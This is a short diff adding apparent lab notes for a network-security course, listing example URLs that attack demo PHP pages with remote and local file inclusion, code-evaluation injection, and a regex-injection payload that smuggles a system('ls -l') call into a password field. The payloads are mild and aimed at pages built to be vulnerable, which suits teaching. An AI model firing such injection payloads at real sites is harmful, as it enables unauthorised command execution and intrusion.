@@ -1,0 +1,13 @@
+File inclusion:
+expected:
+  http://papers.yuhu.biz/netsec2/file-inclusion.php
+url include:
+  http://papers.yuhu.biz/netsec2/file-inclusion.php?path=http://papers.yuhu.biz/netsec2/attack/
+path modification:
+  http://papers.yuhu.biz/netsec2/file-inclusion.php?path=attack/
+
+Code inclustion:
+  http://papers.yuhu.biz/netsec2/code-evaluation.php?arg=echo%20OK;
+
+Regular Expression Inclusion
+  http://papers.yuhu.biz/netsec2/re-injection.php?username=terminus&password=pass1&newpassword=%27.system%28%27ls%20-l%27%29.%27
